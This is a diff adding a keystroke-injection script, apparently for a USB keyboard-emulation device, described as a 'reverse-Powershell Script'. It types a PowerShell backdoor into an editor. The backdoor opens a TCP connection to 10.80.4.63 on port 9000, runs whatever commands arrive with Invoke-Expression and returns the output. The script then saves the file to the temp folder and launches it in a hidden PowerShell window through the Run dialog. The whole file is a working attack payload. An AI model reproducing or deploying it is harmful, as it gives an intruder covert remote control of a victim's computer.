@@ -1,0 +1,275 @@
+REM This is a reverse-Powershell Script
+
+CONTROL ESCAPE
+DELAY 1500
+STRING Editor
+DELAY 600
+ENTER
+DELAY 2000
+ALTSTRING $client = $stream = $buffer = $writer = $data = $result = $null;
+ENTER
+TAB 
+ALTSTRING try {
+ENTER
+TAB 
+ALTSTRING $client = New-Object Net.Sockets.TcpClient("10.80.4.63", 9000);
+ENTER
+TAB 
+ALTSTRING $stream = $client.GetStream();
+ENTER
+TAB 
+ALTSTRING $buffer = New-Object Byte[] 1024;
+ENTER
+TAB 
+ALTSTRING $encoding = New-Object Text.UTF8Encoding;
+ENTER
+TAB 
+ALTSTRING $writer = New-Object IO.StreamWriter($stream, [Text.Encoding]::UTF8, 1024);
+ENTER
+TAB 
+ALTSTRING $writer.AutoFlush = $true;
+ENTER
+TAB 
+ALTSTRING Write-Host "Backdoor is up and running...";
+ENTER
+TAB 
+ALTSTRING Write-Host "";
+ENTER
+TAB 
+ALTSTRING $bytes = 0;
+ENTER
+TAB 
+ALTSTRING do {
+ENTER
+TAB 
+TAB 
+ALTSTRING $writer.Write("PS>");
+ENTER
+TAB 
+TAB
+ALTSTRING do {
+ENTER
+TAB 
+TAB 
+TAB 
+ALTSTRING $bytes = $stream.Read($buffer, 0, $buffer.Length); # blocking
+ENTER
+TAB 
+TAB 
+TAB 
+ALTSTRING if ($bytes -gt 0) {
+ENTER
+TAB 
+TAB 
+TAB 
+TAB 
+ALTSTRING $data += $encoding.GetString($buffer, 0, $bytes);
+ENTER
+TAB 
+TAB 
+TAB
+ALTSTRING }
+ENTER
+TAB 
+TAB 
+ALTSTRING } while ($stream.DataAvailable);
+ENTER
+TAB 
+TAB 
+ALTSTRING if ($bytes -gt 0) {
+ENTER
+TAB 
+TAB 
+TAB 
+ALTSTRING $data = $data.Trim();
+ENTER
+TAB 
+TAB 
+TAB 
+ALTSTRING if ($data.Length -gt 0) {
+ENTER
+TAB 
+TAB 
+TAB
+TAB 
+ALTSTRING try {
+ENTER
+TAB 
+TAB 
+TAB 
+TAB 
+TAB 
+ALTSTRING $result = Invoke-Expression -Command $data 2>&1 | Out-String;
+ENTER
+TAB 
+TAB 
+TAB 
+TAB 
+ALTSTRING } catch {
+ENTER
+TAB 
+TAB 
+TAB 
+TAB 
+TAB 
+ALTSTRING $result = $_.Exception | Out-String;
+ENTER
+TAB 
+TAB 
+TAB 
+TAB
+ALTSTRING }
+ENTER
+TAB 
+TAB 
+TAB
+TAB 
+ALTSTRING Clear-Variable -Name "data";
+ENTER
+TAB 
+TAB 
+TAB 
+TAB 
+ALTSTRING if ($result.Length -gt 0) {
+ENTER
+TAB 
+TAB 
+TAB 
+TAB 
+TAB 
+ALTSTRING $writer.Write($result);
+ENTER
+TAB 
+TAB 
+TAB 
+TAB 
+TAB
+ALTSTRING Clear-Variable -Name "result";
+ENTER
+TAB 
+TAB 
+TAB 
+TAB 
+ALTSTRING }
+ENTER
+TAB 
+TAB 
+TAB 
+ALTSTRING }
+ENTER
+TAB 
+TAB 
+ALTSTRING }
+ENTER
+TAB 
+ALTSTRING } while ($bytes -gt 0);
+ENTER
+TAB 
+ALTSTRING Write-Host "Backdoor will now exit...";
+ENTER
+ALTSTRING } catch {
+ENTER
+TAB 
+ALTSTRING Write-Host $_.Exception.InnerException.Message;
+ENTER
+ALTSTRING } finally {
+ENTER
+TAB 
+ALTSTRING if ($writer -ne $null) {
+ENTER
+TAB 
+TAB 
+ALTSTRING $writer.Close(); $writer.Dispose();
+ENTER
+TAB 
+TAB 
+ALTSTRING Clear-Variable -Name "writer";
+ENTER
+TAB 
+ALTSTRING }
+ENTER
+TAB 
+ALTSTRING if ($stream -ne $null) {
+ENTER
+TAB 
+TAB 
+ALTSTRING $stream.Close(); $stream.Dispose();
+ENTER
+TAB 
+TAB 
+ALTSTRING Clear-Variable -Name "stream";
+ENTER
+TAB 
+ALTSTRING }
+ENTER
+TAB 
+ALTSTRING if ($client -ne $null) {
+ENTER
+TAB 
+TAB 
+ALTSTRING $client.Close(); $client.Dispose();
+ENTER
+TAB 
+ALTSTRING Clear-Variable -Name "client";
+ENTER
+TAB 
+ALTSTRING }
+ENTER
+TAB 
+ALTSTRING if ($buffer -ne $null) {
+ENTER
+TAB 
+TAB 
+ALTSTRING $buffer.Clear();
+ENTER
+TAB 
+TAB 
+ALTSTRING Clear-Variable -Name "buffer";
+ENTER
+TAB 
+ALTSTRING }
+ENTER
+TAB 
+ALTSTRING if ($result -ne $null) {
+ENTER
+TAB 
+TAB 
+ALTSTRING Clear-Variable -Name "result";
+ENTER
+TAB 
+ALTSTRING }
+ENTER
+TAB 
+ALTSTRING if ($data -ne $null) {
+ENTER
+TAB 
+TAB 
+ALTSTRING Clear-Variable -Name "data";
+ENTER
+TAB 
+ALTSTRING }
+ENTER
+TAB 
+ALTSTRING [GC]::Collect();
+ENTER
+ALTSTRING }
+ENTER
+DELAY 1000
+CTRL s
+DELAY 1500
+STRING %temp%.ps1
+TAB
+STRING a
+DELAY 600
+ENTER
+DELAY 1500
+GUI d
+DELAY 600
+GUI r
+DELAY 1500
+STRING powershell
+SPACE
+ALTSTRING -
+STRING w h %temp%.ps1
+ENTER
+
